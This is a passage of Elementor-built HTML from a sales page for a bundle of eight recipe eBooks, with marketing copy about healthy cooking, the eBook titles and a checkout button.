								<div class="elementor-element elementor-element-996ae7d elementor-widget elementor-widget-spacer" data-id="996ae7d" data-element_type="widget" data-widget_type="spacer.default">
				<div class="elementor-widget-container">
					<div class="elementor-spacer">
			<div class="elementor-spacer-inner"></div>
		</div>
				</div>
				</div>
				<div class="elementor-element elementor-element-35b76bf elementor-invisible elementor-widget elementor-widget-text-editor" data-id="35b76bf" data-element_type="widget" data-settings="{&quot;_animation&quot;:&quot;fadeIn&quot;}" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
			<style>/*! elementor - v3.13.0 - 08-05-2023 */
.elementor-widget-text-editor.elementor-drop-cap-view-stacked .elementor-drop-cap{background-color:#69727d;color:#fff}.elementor-widget-text-editor.elementor-drop-cap-view-framed .elementor-drop-cap{color:#69727d;border:3px solid;background-color:transparent}.elementor-widget-text-editor:not(.elementor-drop-cap-view-default) .elementor-drop-cap{margin-top:8px}.elementor-widget-text-editor:not(.elementor-drop-cap-view-default) .elementor-drop-cap-letter{width:1em;height:1em}.elementor-widget-text-editor .elementor-drop-cap{float:left;text-align:center;line-height:1;font-size:50px}.elementor-widget-text-editor .elementor-drop-cap-letter{display:inline-block}</style>				<p><span style="letter-spacing: 0px;">Whether you love cooking already and need a fresh supply of delicious, everyday recipes, or you are a total novice and want to learn how to plan and cook healthy meals, this bundle of recipe eBooks is the perfect way to make every meal time a success! </span></p><p>Use fresh and healthy ingredients that you have never tried cooking with before, or stick to the old classics that ensure all the family appreciates your cooking skills. </p>						</div>
				</div>
				<div class="elementor-element elementor-element-e1cd9e8 elementor-widget elementor-widget-spacer" data-id="e1cd9e8" data-element_type="widget" data-widget_type="spacer.default">
				<div class="elementor-widget-container">
					<div class="elementor-spacer">
			<div class="elementor-spacer-inner"></div>
		</div>
				</div>
				</div>
					</div>
		</div>
							</div>
		</section>
				<section class="elementor-section elementor-top-section elementor-element elementor-element-0a10249 elementor-section-height-min-height elementor-section-boxed elementor-section-height-default elementor-section-items-middle" data-id="0a10249" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;gradient&quot;}">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-28af4fe" data-id="28af4fe" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-fdf413c elementor-widget elementor-widget-heading" data-id="fdf413c" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<style>/*! elementor - v3.13.0 - 08-05-2023 */
.elementor-heading-title{padding:0;margin:0;line-height:1}.elementor-widget-heading .elementor-heading-title[class*=elementor-size-]>a{color:inherit;font-size:inherit;line-height:inherit}.elementor-widget-heading .elementor-heading-title.elementor-size-small{font-size:15px}.elementor-widget-heading .elementor-heading-title.elementor-size-medium{font-size:19px}.elementor-widget-heading .elementor-heading-title.elementor-size-large{font-size:29px}.elementor-widget-heading .elementor-heading-title.elementor-size-xl{font-size:39px}.elementor-widget-heading .elementor-heading-title.elementor-size-xxl{font-size:59px}</style><h2 class="elementor-heading-title elementor-size-default">Imagine enjoying delicious meals like this every day...</h2>		</div>
				</div>
				<div class="elementor-element elementor-element-60a950d elementor-widget elementor-widget-image" data-id="60a950d" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
															<img decoding="async" src="../aztechost.com/images/recipe/uploads/2021/03/meals3.png" title="" alt="" loading="lazy" />															</div>
				</div>
				<div class="elementor-element elementor-element-5c7b016 elementor-widget elementor-widget-spacer" data-id="5c7b016" data-element_type="widget" data-widget_type="spacer.default">
				<div class="elementor-widget-container">
					<div class="elementor-spacer">
			<div class="elementor-spacer-inner"></div>
		</div>
				</div>
				</div>
					</div>
		</div>
							</div>
		</section>
				<section class="elementor-section elementor-top-section elementor-element elementor-element-d53ea47 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="d53ea47" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-0336310" data-id="0336310" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-4f936a3 elementor-widget elementor-widget-heading" data-id="4f936a3" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">Why do you need these recipe books in your life right now? </h2>		</div>
				</div>
				<div class="elementor-element elementor-element-bce4370 elementor-widget elementor-widget-text-editor" data-id="bce4370" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
							<p><span style="letter-spacing: 0px;">Learning to cook properly can have amazing effects on your health and wellbeing. </span></p><p><b>Here are just some of the benefits you can enjoy:</b></p>						</div>
				</div>
				<div class="elementor-element elementor-element-31d0ace elementor-position-left elementor-view-default elementor-mobile-position-top elementor-vertical-align-top elementor-widget elementor-widget-icon-box" data-id="31d0ace" data-element_type="widget" data-widget_type="icon-box.default">
				<div class="elementor-widget-container">
			<link rel="stylesheet" href="wp-content/plugins/elementor/assets/css/widget-icon-box.min.css">		<div class="elementor-icon-box-wrapper">
						<div class="elementor-icon-box-icon">
				<span class="elementor-icon elementor-animation-" >
				<svg aria-hidden="true" class="e-font-icon-svg e-fas-check-circle" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M504 256c0 136.967-111.033 248-248 248S8 392.967 8 256 119.033 8 256 8s248 111.033 248 248zM227.314 387.314l184-184c6.248-6.248 6.248-16.379 0-22.627l-22.627-22.627c-6.248-6.249-16.379-6.249-22.628 0L216 308.118l-70.059-70.059c-6.248-6.248-16.379-6.248-22.628 0l-22.627 22.627c-6.248 6.248-6.248 16.379 0 22.627l104 104c6.249 6.249 16.379 6.249 22.628.001z"></path></svg>				</span>
			</div>
						<div class="elementor-icon-box-content">
				<p class="elementor-icon-box-title">
					<span  >
						Improved Lifestyle					</span>
				</p>
									<p class="elementor-icon-box-description">
						Taking time out to really enjoy cooking can boost your happiness, provide you with a creative outlet, and enable you to feel better about yourself. 					</p>
							</div>
		</div>
				</div>
				</div>
				<div class="elementor-element elementor-element-1383f0b elementor-position-left elementor-view-default elementor-mobile-position-top elementor-vertical-align-top elementor-widget elementor-widget-icon-box" data-id="1383f0b" data-element_type="widget" data-widget_type="icon-box.default">
				<div class="elementor-widget-container">
					<div class="elementor-icon-box-wrapper">
						<div class="elementor-icon-box-icon">
				<span class="elementor-icon elementor-animation-" >
				<svg aria-hidden="true" class="e-font-icon-svg e-fas-check-circle" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M504 256c0 136.967-111.033 248-248 248S8 392.967 8 256 119.033 8 256 8s248 111.033 248 248zM227.314 387.314l184-184c6.248-6.248 6.248-16.379 0-22.627l-22.627-22.627c-6.248-6.249-16.379-6.249-22.628 0L216 308.118l-70.059-70.059c-6.248-6.248-16.379-6.248-22.628 0l-22.627 22.627c-6.248 6.248-6.248 16.379 0 22.627l104 104c6.249 6.249 16.379 6.249 22.628.001z"></path></svg>				</span>
			</div>
						<div class="elementor-icon-box-content">
				<p class="elementor-icon-box-title">
					<span  >
						Improved Health					</span>
				</p>
									<p class="elementor-icon-box-description">
						Using a wider range of fresh fruit and vegetables in your cooking will help you to get all the vitamins and minerals you need for a healthy diet. 					</p>
							</div>
		</div>
				</div>
				</div>
				<div class="elementor-element elementor-element-bfad71e elementor-position-left elementor-view-default elementor-mobile-position-top elementor-vertical-align-top elementor-widget elementor-widget-icon-box" data-id="bfad71e" data-element_type="widget" data-widget_type="icon-box.default">
				<div class="elementor-widget-container">
					<div class="elementor-icon-box-wrapper">
						<div class="elementor-icon-box-icon">
				<span class="elementor-icon elementor-animation-" >
				<svg aria-hidden="true" class="e-font-icon-svg e-fas-check-circle" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M504 256c0 136.967-111.033 248-248 248S8 392.967 8 256 119.033 8 256 8s248 111.033 248 248zM227.314 387.314l184-184c6.248-6.248 6.248-16.379 0-22.627l-22.627-22.627c-6.248-6.249-16.379-6.249-22.628 0L216 308.118l-70.059-70.059c-6.248-6.248-16.379-6.248-22.628 0l-22.627 22.627c-6.248 6.248-6.248 16.379 0 22.627l104 104c6.249 6.249 16.379 6.249 22.628.001z"></path></svg>				</span>
			</div>
						<div class="elementor-icon-box-content">
				<p class="elementor-icon-box-title">
					<span  >
						Weight Loss					</span>
				</p>
									<p class="elementor-icon-box-description">
						Using more fresh ingredients and reducing your intake of preprepared meals with hidden saturated fats can help you to achieve your weight loss goals. 					</p>
							</div>
		</div>
				</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-ecf777e elementor-hidden-phone" data-id="ecf777e" data-element_type="column">
			<div class="elementor-widget-wrap">
									</div>
		</div>
							</div>
		</section>
				<section class="elementor-section elementor-top-section elementor-element elementor-element-6b2a620 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="6b2a620" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-6457a02" data-id="6457a02" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-ec9f6f2 elementor-widget elementor-widget-spacer" data-id="ec9f6f2" data-element_type="widget" data-widget_type="spacer.default">
				<div class="elementor-widget-container">
					<div class="elementor-spacer">
			<div class="elementor-spacer-inner"></div>
		</div>
				</div>
				</div>
				<div class="elementor-element elementor-element-8d8ccd0 elementor-widget elementor-widget-text-editor" data-id="8d8ccd0" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
							<p>Do you have what it takes to be creative in the kitchen? With this incredible bundle of recipe books, anyone can learn how to cook better, healthier meals, every meal time. There are so many different recipes to choose from, each with their own set of benefits, so you will never get bored of eating the same old meals over and over again. The bundle contains a wide range of recipes that all the family can enjoy and meal plans to help you save time and keep motivated. </p><p>So if you want to entertain and impress, how better than to show off your new found culinary skills and treat your friends and family to delicious meals they won&#8217;t forget. </p>						</div>
				</div>
				<div class="elementor-element elementor-element-eeb449c elementor-widget elementor-widget-spacer" data-id="eeb449c" data-element_type="widget" data-widget_type="spacer.default">
				<div class="elementor-widget-container">
					<div class="elementor-spacer">
			<div class="elementor-spacer-inner"></div>
		</div>
				</div>
				</div>
				<div class="elementor-element elementor-element-7e00189 elementor-widget elementor-widget-heading" data-id="7e00189" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h1 class="elementor-heading-title elementor-size-default">Tasty Cooking Ideas Bundle</h1>		</div>
				</div>
				<section class="elementor-section elementor-inner-section elementor-element elementor-element-f7d93d0 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="f7d93d0" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-9f44fb1" data-id="9f44fb1" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-505a742 elementor-widget elementor-widget-image" data-id="505a742" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
															<img decoding="async" src="../aztechost.com/images/recipe/uploads/2021/03/recipe-large.png" title="" alt="" loading="lazy" />															</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-8cde89c" data-id="8cde89c" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-639e5d8 elementor-widget elementor-widget-spacer" data-id="639e5d8" data-element_type="widget" data-widget_type="spacer.default">
				<div class="elementor-widget-container">
					<div class="elementor-spacer">
			<div class="elementor-spacer-inner"></div>
		</div>
				</div>
				</div>
				<div class="elementor-element elementor-element-3eafbe9 elementor-icon-list--layout-traditional elementor-list-item-link-full_width elementor-widget elementor-widget-icon-list" data-id="3eafbe9" data-element_type="widget" data-widget_type="icon-list.default">
				<div class="elementor-widget-container">
					<ul class="elementor-icon-list-items">
							<li class="elementor-icon-list-item">
											<span class="elementor-icon-list-icon">
							<svg aria-hidden="true" class="e-font-icon-svg e-fas-check" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M173.898 439.404l-166.4-166.4c-9.997-9.997-9.997-26.206 0-36.204l36.203-36.204c9.997-9.998 26.207-9.998 36.204 0L192 312.69 432.095 72.596c9.997-9.997 26.207-9.997 36.204 0l36.203 36.204c9.997 9.997 9.997 26.206 0 36.204l-294.4 294.401c-9.998 9.997-26.207 9.997-36.204-.001z"></path></svg>						</span>
										<span class="elementor-icon-list-text">Learn how to cook creatively</span>
									</li>
								<li class="elementor-icon-list-item">
											<span class="elementor-icon-list-icon">
							<svg aria-hidden="true" class="e-font-icon-svg e-fas-check" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M173.898 439.404l-166.4-166.4c-9.997-9.997-9.997-26.206 0-36.204l36.203-36.204c9.997-9.998 26.207-9.998 36.204 0L192 312.69 432.095 72.596c9.997-9.997 26.207-9.997 36.204 0l36.203 36.204c9.997 9.997 9.997 26.206 0 36.204l-294.4 294.401c-9.998 9.997-26.207 9.997-36.204-.001z"></path></svg>						</span>
										<span class="elementor-icon-list-text">Enjoy a healthier diet</span>
									</li>
								<li class="elementor-icon-list-item">
											<span class="elementor-icon-list-icon">
							<svg aria-hidden="true" class="e-font-icon-svg e-fas-check" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M173.898 439.404l-166.4-166.4c-9.997-9.997-9.997-26.206 0-36.204l36.203-36.204c9.997-9.998 26.207-9.998 36.204 0L192 312.69 432.095 72.596c9.997-9.997 26.207-9.997 36.204 0l36.203 36.204c9.997 9.997 9.997 26.206 0 36.204l-294.4 294.401c-9.998 9.997-26.207 9.997-36.204-.001z"></path></svg>						</span>
										<span class="elementor-icon-list-text">Vegan and keto friendly recipes</span>
									</li>
								<li class="elementor-icon-list-item">
											<span class="elementor-icon-list-icon">
							<svg aria-hidden="true" class="e-font-icon-svg e-fas-check" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M173.898 439.404l-166.4-166.4c-9.997-9.997-9.997-26.206 0-36.204l36.203-36.204c9.997-9.998 26.207-9.998 36.204 0L192 312.69 432.095 72.596c9.997-9.997 26.207-9.997 36.204 0l36.203 36.204c9.997 9.997 9.997 26.206 0 36.204l-294.4 294.401c-9.998 9.997-26.207 9.997-36.204-.001z"></path></svg>						</span>
										<span class="elementor-icon-list-text">Learn about clean eating and healthy living</span>
									</li>
								<li class="elementor-icon-list-item">
											<span class="elementor-icon-list-icon">
							<svg aria-hidden="true" class="e-font-icon-svg e-fas-check" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M173.898 439.404l-166.4-166.4c-9.997-9.997-9.997-26.206 0-36.204l36.203-36.204c9.997-9.998 26.207-9.998 36.204 0L192 312.69 432.095 72.596c9.997-9.997 26.207-9.997 36.204 0l36.203 36.204c9.997 9.997 9.997 26.206 0 36.204l-294.4 294.401c-9.998 9.997-26.207 9.997-36.204-.001z"></path></svg>						</span>
										<span class="elementor-icon-list-text">Improve your overall lifestyle and boost your happiness</span>
									</li>
						</ul>
				</div>
				</div>
					</div>
		</div>
							</div>
		</section>
					</div>
		</div>
							</div>
		</section>
				<section class="elementor-section elementor-top-section elementor-element elementor-element-a8b8db7 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="a8b8db7" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-ff8a548" data-id="ff8a548" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-210b64b elementor-widget elementor-widget-heading" data-id="210b64b" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h3 class="elementor-heading-title elementor-size-default">Get Instant Access to these 8 Modules TODAY!</h3>		</div>
				</div>
				<div class="elementor-element elementor-element-8445e2e elementor-widget__width-initial elementor-widget elementor-widget-text-editor" data-id="8445e2e" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
							<p>The Tasty Cooking Ideas bundle is made up of 8 separate eBooks which cover everything that you need to know about how to rule in the kitchen.</p>						</div>
				</div>
				<section class="elementor-section elementor-inner-section elementor-element elementor-element-03b6776 elementor-section-full_width elementor-section-height-default elementor-section-height-default" data-id="03b6776" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-25 elementor-inner-column elementor-element elementor-element-cd10cac" data-id="cd10cac" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-a0791b4 elementor-position-top elementor-vertical-align-top elementor-widget elementor-widget-image-box" data-id="a0791b4" data-element_type="widget" data-widget_type="image-box.default">
				<div class="elementor-widget-container">
			<style>/*! elementor - v3.13.0 - 08-05-2023 */
.elementor-widget-image-box .elementor-image-box-content{width:100%}@media (min-width:768px){.elementor-widget-image-box.elementor-position-left .elementor-image-box-wrapper,.elementor-widget-image-box.elementor-position-right .elementor-image-box-wrapper{display:flex}.elementor-widget-image-box.elementor-position-right .elementor-image-box-wrapper{text-align:right;flex-direction:row-reverse}.elementor-widget-image-box.elementor-position-left .elementor-image-box-wrapper{text-align:left;flex-direction:row}.elementor-widget-image-box.elementor-position-top .elementor-image-box-img{margin:auto}.elementor-widget-image-box.elementor-vertical-align-top .elementor-image-box-wrapper{align-items:flex-start}.elementor-widget-image-box.elementor-vertical-align-middle .elementor-image-box-wrapper{align-items:center}.elementor-widget-image-box.elementor-vertical-align-bottom .elementor-image-box-wrapper{align-items:flex-end}}@media (max-width:767px){.elementor-widget-image-box .elementor-image-box-img{margin-left:auto!important;margin-right:auto!important;margin-bottom:15px}}.elementor-widget-image-box .elementor-image-box-img{display:inline-block}.elementor-widget-image-box .elementor-image-box-title a{color:inherit}.elementor-widget-image-box .elementor-image-box-wrapper{text-align:center}.elementor-widget-image-box .elementor-image-box-description{margin:0}</style><div class="elementor-image-box-wrapper"><figure class="elementor-image-box-img"><img decoding="async" src="../aztechost.com/images/recipe/uploads/2021/04/1.png" title="" alt="" loading="lazy" /></figure><div class="elementor-image-box-content"><h3 class="elementor-image-box-title">Clean Eating Explained</h3></div></div>		</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-25 elementor-inner-column elementor-element elementor-element-332daee" data-id="332daee" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-b851ea2 elementor-position-top elementor-vertical-align-top elementor-widget elementor-widget-image-box" data-id="b851ea2" data-element_type="widget" data-widget_type="image-box.default">
				<div class="elementor-widget-container">
			<div class="elementor-image-box-wrapper"><figure class="elementor-image-box-img"><img decoding="async" src="../aztechost.com/images/recipe/uploads/2021/04/2.png" title="" alt="" loading="lazy" /></figure><div class="elementor-image-box-content"><h3 class="elementor-image-box-title">Learn to Cook More Effectively</h3></div></div>		</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-25 elementor-inner-column elementor-element elementor-element-cb5a92b" data-id="cb5a92b" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-df8b5c5 elementor-position-top elementor-vertical-align-top elementor-widget elementor-widget-image-box" data-id="df8b5c5" data-element_type="widget" data-widget_type="image-box.default">
				<div class="elementor-widget-container">
			<div class="elementor-image-box-wrapper"><figure class="elementor-image-box-img"><img decoding="async" src="../aztechost.com/images/recipe/uploads/2021/04/3.png" title="" alt="" loading="lazy" /></figure><div class="elementor-image-box-content"><h3 class="elementor-image-box-title">Healthy Eating Made Easy</h3></div></div>		</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-25 elementor-inner-column elementor-element elementor-element-d2f5d6d" data-id="d2f5d6d" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-af0a3fe elementor-position-top elementor-vertical-align-top elementor-widget elementor-widget-image-box" data-id="af0a3fe" data-element_type="widget" data-widget_type="image-box.default">
				<div class="elementor-widget-container">
			<div class="elementor-image-box-wrapper"><figure class="elementor-image-box-img"><img decoding="async" src="../aztechost.com/images/recipe/uploads/2021/04/4.png" title="" alt="" loading="lazy" /></figure><div class="elementor-image-box-content"><h3 class="elementor-image-box-title">Simple Gluten Free Recipes</h3></div></div>		</div>
				</div>
					</div>
		</div>
							</div>
		</section>
				<section class="elementor-section elementor-inner-section elementor-element elementor-element-3aad4b6 elementor-section-full_width elementor-section-height-default elementor-section-height-default" data-id="3aad4b6" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-25 elementor-inner-column elementor-element elementor-element-9fdaf70" data-id="9fdaf70" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-fc9ad4b elementor-position-top elementor-vertical-align-top elementor-widget elementor-widget-image-box" data-id="fc9ad4b" data-element_type="widget" data-widget_type="image-box.default">
				<div class="elementor-widget-container">
			<div class="elementor-image-box-wrapper"><figure class="elementor-image-box-img"><img decoding="async" src="../aztechost.com/images/recipe/uploads/2021/04/5.png" title="" alt="" loading="lazy" /></figure><div class="elementor-image-box-content"><h3 class="elementor-image-box-title">Keto Diet Recipe Cookbook</h3></div></div>		</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-25 elementor-inner-column elementor-element elementor-element-3917d2b" data-id="3917d2b" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-161557a elementor-position-top elementor-vertical-align-top elementor-widget elementor-widget-image-box" data-id="161557a" data-element_type="widget" data-widget_type="image-box.default">
				<div class="elementor-widget-container">
			<div class="elementor-image-box-wrapper"><figure class="elementor-image-box-img"><img decoding="async" src="../aztechost.com/images/recipe/uploads/2021/04/6.png" title="" alt="" loading="lazy" /></figure><div class="elementor-image-box-content"><h3 class="elementor-image-box-title">Plant Based Recipe Cookbook</h3></div></div>		</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-25 elementor-inner-column elementor-element elementor-element-088f2e4" data-id="088f2e4" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-97ffb51 elementor-position-top elementor-vertical-align-top elementor-widget elementor-widget-image-box" data-id="97ffb51" data-element_type="widget" data-widget_type="image-box.default">
				<div class="elementor-widget-container">
			<div class="elementor-image-box-wrapper"><figure class="elementor-image-box-img"><img decoding="async" src="../aztechost.com/images/recipe/uploads/2021/04/7.png" title="" alt="" loading="lazy" /></figure><div class="elementor-image-box-content"><h3 class="elementor-image-box-title">Superfood Cooking Explained</h3></div></div>		</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-25 elementor-inner-column elementor-element elementor-element-1008ed1" data-id="1008ed1" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-ece240d elementor-position-top elementor-vertical-align-top elementor-widget elementor-widget-image-box" data-id="ece240d" data-element_type="widget" data-widget_type="image-box.default">
				<div class="elementor-widget-container">
			<div class="elementor-image-box-wrapper"><figure class="elementor-image-box-img"><img decoding="async" src="../aztechost.com/images/recipe/uploads/2021/04/8.png" title="" alt="" loading="lazy" /></figure><div class="elementor-image-box-content"><h3 class="elementor-image-box-title">Delicious Vegan Recipes</h3></div></div>		</div>
				</div>
					</div>
		</div>
							</div>
		</section>
				<div class="elementor-element elementor-element-054fee2 elementor-align-center elementor-widget elementor-widget-button" data-id="054fee2" data-element_type="widget" data-widget_type="button.default">
				<div class="elementor-widget-container">
					<div class="elementor-button-wrapper">
			<a href="checkout/index4f50.html?add-to-cart=537" class="elementor-button-link elementor-button elementor-size-lg" role="button">
						<span class="elementor-button-content-wrapper">
						<span class="elementor-button-text">Click Here To Buy Now</span>
		</span>
					</a>
		</div>
				</div>
				</div>
					</div>
		</div>
							</div>
		</section>
				<section class="elementor-section elementor-top-section elementor-element elementor-element-deb19cb elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="deb19cb" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-d7431dc" data-id="d7431dc" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-8509993 elementor-widget elementor-widget-heading" data-id="8509993" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h3 class="elementor-heading-title elementor-size-default">Who is This Bundle For?</h3>		</div>
				</div>
				<section class="elementor-section elementor-inner-section elementor-element elementor-element-3312dcf elementor-section-full_width elementor-section-height-default elementor-section-height-default" data-id="3312dcf" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-25 elementor-inner-column elementor-element elementor-element-d47bb82" data-id="d47bb82" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-8b8a3e6 elementor-view-default elementor-mobile-position-top elementor-vertical-align-top elementor-widget elementor-widget-icon-box" data-id="8b8a3e6" data-element_type="widget" data-widget_type="icon-box.default">
				<div class="elementor-widget-container">
					<div class="elementor-icon-box-wrapper">
						<div class="elementor-icon-box-icon">
				<span class="elementor-icon elementor-animation-" >
				<svg aria-hidden="true" class="e-font-icon-svg e-fas-user" viewBox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><path d="M224 256c70.7 0 128-57.3 128-128S294.7 0 224 0 96 57.3 96 128s57.3 128 128 128zm89.6 32h-16.7c-22.2 10.2-46.9 16-72.9 16s-50.6-5.8-72.9-16h-16.7C60.2 288 0 348.2 0 422.4V464c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48v-41.6c0-74.2-60.2-134.4-134.4-134.4z"></path></svg>				</span>
			</div>
						<div class="elementor-icon-box-content">
				<h3 class="elementor-icon-box-title">
					<span  >
						Newbies					</span>
				</h3>
									<p class="elementor-icon-box-description">
						If you are just starting your cooking journey, this is the perfect place to start.					</p>
							</div>
		</div>
				</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-25 elementor-inner-column elementor-element elementor-element-a59aedc" data-id="a59aedc" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-cffa3da elementor-view-default elementor-mobile-position-top elementor-vertical-align-top elementor-widget elementor-widget-icon-box" data-id="cffa3da" data-element_type="widget" data-widget_type="icon-box.default">
				<div class="elementor-widget-container">
					<div class="elementor-icon-box-wrapper">
						<div class="elementor-icon-box-icon">
				<span class="elementor-icon elementor-animation-" >
				<svg aria-hidden="true" class="e-font-icon-svg e-fas-hamburger" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M464 256H48a48 48 0 0 0 0 96h416a48 48 0 0 0 0-96zm16 128H32a16 16 0 0 0-16 16v16a64 64 0 0 0 64 64h352a64 64 0 0 0 64-64v-16a16 16 0 0 0-16-16zM58.64 224h394.72c34.57 0 54.62-43.9 34.82-75.88C448 83.2 359.55 32.1 256 32c-103.54.1-192 51.2-232.18 116.11C4 180.09 24.07 224 58.64 224zM384 112a16 16 0 1 1-16 16 16 16 0 0 1 16-16zM256 80a16 16 0 1 1-16 16 16 16 0 0 1 16-16zm-128 32a16 16 0 1 1-16 16 16 16 0 0 1 16-16z"></path></svg>				</span>
			</div>
						<div class="elementor-icon-box-content">
				<h3 class="elementor-icon-box-title">
					<span  >
						Junk Food Munchers					</span>
				</h3>
									<p class="elementor-icon-box-description">
						Are you sick of eating unhealthy food full of saturated fats? Cook healthy balanced dishes and ditch the junk food today!					</p>
							</div>
		</div>
				</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-25 elementor-inner-column elementor-element elementor-element-ec80417" data-id="ec80417" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-9b7d349 elementor-view-default elementor-mobile-position-top elementor-vertical-align-top elementor-widget elementor-widget-icon-box" data-id="9b7d349" data-element_type="widget" data-widget_type="icon-box.default">
				<div class="elementor-widget-container">
					<div class="elementor-icon-box-wrapper">
						<div class="elementor-icon-box-icon">
				<span class="elementor-icon elementor-animation-" >
				<svg aria-hidden="true" class="e-font-icon-svg e-fas-briefcase" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M320 336c0 8.84-7.16 16-16 16h-96c-8.84 0-16-7.16-16-16v-48H0v144c0 25.6 22.4 48 48 48h416c25.6 0 48-22.4 48-48V288H320v48zm144-208h-80V80c0-25.6-22.4-48-48-48H176c-25.6 0-48 22.4-48 48v48H48c-25.6 0-48 22.4-48 48v80h512v-80c0-25.6-22.4-48-48-48zm-144 0H192V96h128v32z"></path></svg>				</span>
			</div>
						<div class="elementor-icon-box-content">
				<h3 class="elementor-icon-box-title">
					<span  >
						Busy Bees					</span>
				</h3>
									<p class="elementor-icon-box-description">
						If you want to cook but don't have much time, these books will help you learn how to fit healthy eating into your day.					</p>
							</div>
		</div>
				</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-25 elementor-inner-column elementor-element elementor-element-15fe741" data-id="15fe741" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-96df6d3 elementor-view-default elementor-mobile-position-top elementor-vertical-align-top elementor-widget elementor-widget-icon-box" data-id="96df6d3" data-element_type="widget" data-widget_type="icon-box.default">
				<div class="elementor-widget-container">
					<div class="elementor-icon-box-wrapper">
						<div class="elementor-icon-box-icon">
